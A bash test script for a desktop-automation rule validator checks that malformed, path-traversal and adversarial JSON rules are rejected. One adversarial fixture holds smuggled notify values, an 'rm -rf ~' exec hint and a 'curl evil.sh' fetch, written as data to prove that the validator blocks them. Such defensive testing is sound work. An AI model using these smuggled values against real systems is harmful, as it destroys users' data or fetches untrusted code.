#!/bin/bash

# Validator fixtures: schema failures fail, referential failures fail,
# not-currently-present hardware only warns.

set -euo pipefail
trap 'echo "$0: FAILED at line $LINENO" >&2' ERR

plugin_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
test_root=$(mktemp -d)
trap 'rm -rf "$test_root"' EXIT

fake_bin="$test_root/bin"
apps_dir="$test_root/share/applications"
mkdir -p "$fake_bin" "$apps_dir"

printf '#!/bin/bash\nif [[ "$*" == *"theme list"* ]]; then printf "tokyo-night\nkanagawa\n"; fi\n' >"$fake_bin/omarchy"
printf '#!/bin/bash\necho "[]"\n' >"$fake_bin/pactl"
chmod +x "$fake_bin"/*
printf '[Desktop Entry]\nName=Slack\nExec=slack\n' >"$apps_dir/slack.desktop"

validate() {
  HOME="$test_root" \
  XDG_DATA_HOME="$test_root/share" \
  OMAFLOW_LID_DIR="${TEST_LID_DIR:-$test_root/no-lid}" \
  PATH="$fake_bin:/usr/bin:/bin" \
    "$plugin_dir/bin/omaflow-validate" "$1"
}

good="$test_root/good.json"
cat >"$good" <<'EOF'
{
  "schemaVersion": 1, "id": "good-rule", "name": "Good", "enabled": true,
  "trigger": {"type": "wifi-connected", "match": {"ssid": "Office"}},
  "conditions": [{"type": "weekday", "days": ["mon", "fri"]}],
  "actions": [
    {"type": "theme", "name": "kanagawa"},
    {"type": "launch", "app": "Slack", "workspace": 3},
    {"type": "audio-output", "match": "dock"}
  ],
  "cooldownSeconds": 60, "source": "test"
}
EOF
out=$(validate "$good")
grep -q "^warn:.*dock" <<<"$out"      # sink not present → warning only
! grep -q "^error:" <<<"$out"

bad="$test_root/bad.json"
cat >"$bad" <<'EOF'
{
  "schemaVersion": 1, "id": "Bad_ID!", "name": "Bad", "enabled": "yes",
  "trigger": {"type": "full-moon"},
  "actions": [
    {"type": "theme", "name": "no-such-theme"},
    {"type": "launch", "app": "NoSuchApp"},
    {"type": "self-destruct"}
  ],
  "extraField": true, "source": "test"
}
EOF
if validate "$bad" >"$test_root/bad.out"; then
  echo "bad rule unexpectedly validated" >&2
  exit 1
fi
grep -q "error: id must be" "$test_root/bad.out"
grep -q "error: enabled must be" "$test_root/bad.out"
grep -q "error: unknown trigger type: full-moon" "$test_root/bad.out"
grep -q "error: theme not installed" "$test_root/bad.out"
grep -q "error: no desktop entry" "$test_root/bad.out"
grep -q "error: unknown action type: self-destruct" "$test_root/bad.out"
grep -q "error: unknown top-level field" "$test_root/bad.out"

# Adversarial: notification fields must never be option-shaped (a leading
# dash could smuggle a notify-send exec hint) and numbers must be integers.
evil="$test_root/evil.json"
cat >"$evil" <<'EOF'
{
  "schemaVersion": 1, "id": "evil-rule", "name": "Evil", "enabled": true,
  "trigger": {"type": "manual", "sneaky": true},
  "actions": [
    {"type": "notify", "title": "--hint=string:omarchy-exec:rm -rf ~", "message": "hi"},
    {"type": "notify", "message": "-e curl evil.sh"},
    {"type": "workspace", "number": 2.5}
  ],
  "cooldownSeconds": 0.5, "source": "test"
}
EOF
if validate "$evil" >"$test_root/evil.out"; then
  echo "evil rule unexpectedly validated" >&2
  exit 1
fi
grep -q "error: notify title must be" "$test_root/evil.out"
grep -q "error: notify needs a plain-string message" "$test_root/evil.out"
grep -q "error: workspace needs an integer" "$test_root/evil.out"
grep -q "error: cooldownSeconds must be an integer" "$test_root/evil.out"
grep -q "error: unknown field in .trigger" "$test_root/evil.out"

file_good="$test_root/file-good.json"
cat >"$file_good" <<'EOF'
{
  "schemaVersion": 1, "id": "file-good", "name": "File good", "enabled": true,
  "trigger": {"type": "file-created", "path": "~/Downloads", "match": {"name": ".pdf"}},
  "actions": [{"type": "notify", "message": "{{name}} at {{path}}"}], "source": "test"
}
EOF
out=$(validate "$file_good")
! grep -q "^error:" <<<"$out"

file_missing="$test_root/file-missing.json"
cat >"$file_missing" <<'EOF'
{
  "schemaVersion": 1, "id": "file-missing", "name": "File missing", "enabled": true,
  "trigger": {"type": "folder-created"},
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$file_missing" >"$test_root/file-missing.out"; then
  echo "file trigger without a path unexpectedly validated" >&2
  exit 1
fi
grep -q "error: folder-created needs path" "$test_root/file-missing.out"

file_relative="$test_root/file-relative.json"
cat >"$file_relative" <<'EOF'
{
  "schemaVersion": 1, "id": "file-relative", "name": "File relative", "enabled": true,
  "trigger": {"type": "file-created", "path": "Downloads"},
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$file_relative" >"$test_root/file-relative.out"; then
  echo "relative file trigger path unexpectedly validated" >&2
  exit 1
fi
grep -q "error: file-created needs path" "$test_root/file-relative.out"

file_parent="$test_root/file-parent.json"
cat >"$file_parent" <<'EOF'
{
  "schemaVersion": 1, "id": "file-parent", "name": "File parent", "enabled": true,
  "trigger": {"type": "file-created", "path": "~/Downloads/../Secrets"},
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$file_parent" >"$test_root/file-parent.out"; then
  echo "parent-segment file trigger path unexpectedly validated" >&2
  exit 1
fi
grep -q "error: file-created needs path" "$test_root/file-parent.out"

file_unknown_match="$test_root/file-unknown-match.json"
cat >"$file_unknown_match" <<'EOF'
{
  "schemaVersion": 1, "id": "file-unknown-match", "name": "File unknown match", "enabled": true,
  "trigger": {"type": "folder-created", "path": "/tmp", "match": {"name": "work", "kind": "dir"}},
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$file_unknown_match" >"$test_root/file-unknown-match.out"; then
  echo "unknown file match field unexpectedly validated" >&2
  exit 1
fi
grep -q "error: unknown field in .trigger.match: kind" "$test_root/file-unknown-match.out"

custom_missing="$test_root/custom-missing.json"
cat >"$custom_missing" <<'EOF'
{
  "schemaVersion": 1, "id": "custom-missing", "name": "Custom missing", "enabled": true,
  "trigger": {"type": "custom"},
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$custom_missing" >"$test_root/custom-missing.out"; then
  echo "custom trigger without a name unexpectedly validated" >&2
  exit 1
fi
grep -q "error: custom trigger needs name as a lowercase slug" "$test_root/custom-missing.out"

custom_bad="$test_root/custom-bad.json"
cat >"$custom_bad" <<'EOF'
{
  "schemaVersion": 1, "id": "custom-bad", "name": "Custom bad", "enabled": true,
  "trigger": {"type": "custom", "name": "Bad_Name"},
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$custom_bad" >"$test_root/custom-bad.out"; then
  echo "custom trigger with a bad name unexpectedly validated" >&2
  exit 1
fi
grep -q "error: custom trigger needs name as a lowercase slug" "$test_root/custom-bad.out"

custom_unknown="$test_root/custom-unknown.json"
cat >"$custom_unknown" <<'EOF'
{
  "schemaVersion": 1, "id": "custom-unknown", "name": "Custom unknown", "enabled": true,
  "trigger": {"type": "custom", "name": "deploy-done", "extra": true},
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$custom_unknown" >"$test_root/custom-unknown.out"; then
  echo "custom trigger with an unknown field unexpectedly validated" >&2
  exit 1
fi
grep -q "error: unknown field in .trigger: extra" "$test_root/custom-unknown.out"

app_missing="$test_root/app-missing.json"
cat >"$app_missing" <<'EOF'
{
  "schemaVersion": 1, "id": "app-missing", "name": "App missing", "enabled": true,
  "trigger": {"type": "app-opened"},
  "conditions": [{"type": "app-running"}],
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$app_missing" >"$test_root/app-missing.out"; then
  echo "window rules without matches unexpectedly validated" >&2
  exit 1
fi
grep -q "error: app-opened needs match.class or match.title" "$test_root/app-missing.out"
grep -q "error: app-running needs match.class or match.title" "$test_root/app-missing.out"

blank_match="$test_root/blank-match.json"
cat >"$blank_match" <<'EOF'
{
  "schemaVersion": 1, "id": "blank-match", "name": "Blank match", "enabled": true,
  "trigger": {"type": "app-opened", "match": {"class": " "}},
  "conditions": [
    {"type": "monitor-present", "match": {"name": " "}},
    {"type": "app-running", "match": {"title": " "}},
    {"type": "on-ssid", "ssid": " "}
  ],
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$blank_match" >"$test_root/blank-match.out"; then
  echo "blank match strings unexpectedly validated" >&2
  exit 1
fi
grep -q "error: app-opened needs match.class or match.title" "$test_root/blank-match.out"
grep -q "error: monitor-present needs a plain-string match" "$test_root/blank-match.out"
grep -q "error: app-running needs match.class or match.title" "$test_root/blank-match.out"
grep -q "error: on-ssid needs a plain-string ssid" "$test_root/blank-match.out"

app_unknown="$test_root/app-unknown.json"
cat >"$app_unknown" <<'EOF'
{
  "schemaVersion": 1, "id": "app-unknown", "name": "App unknown", "enabled": true,
  "trigger": {"type": "app-closed", "match": {"title": "Zoom", "role": "call"}, "once": true},
  "conditions": [{"type": "app-running", "match": {"class": "zoom", "role": "call"}, "cached": true}],
  "actions": [{"type": "notify", "message": "x"}], "source": "test"
}
EOF
if validate "$app_unknown" >"$test_root/app-unknown.out"; then
  echo "window rules with unknown fields unexpectedly validated" >&2
  exit 1
fi
grep -q "error: unknown field in .trigger: once" "$test_root/app-unknown.out"
grep -q "error: unknown field in .trigger.match: role" "$test_root/app-unknown.out"
grep -q "error: unknown field in app-running condition: cached" "$test_root/app-unknown.out"
grep -q "error: unknown field in app-running condition match: role" "$test_root/app-unknown.out"

lid="$test_root/lid.json"
cat >"$lid" <<'EOF'
{
  "schemaVersion": 1, "id": "lid-rule", "name": "Lid", "enabled": true,
  "trigger": {"type": "lid-closed"},
  "conditions": [{"type": "lid-state", "state": "closed"}],
  "actions": [{"type": "notify", "message": "closed"}], "source": "test"
}
EOF
out=$(validate "$lid")
[[ $(grep -c '^warn:.*no laptop lid state' <<<"$out") == 1 ]]
mkdir -p "$test_root/lid/LID0"
echo 'state: open' >"$test_root/lid/LID0/state"
out=$(TEST_LID_DIR="$test_root/lid" validate "$lid")
! grep -q '^warn:.*lid' <<<"$out"

echo "test-validate: ok"
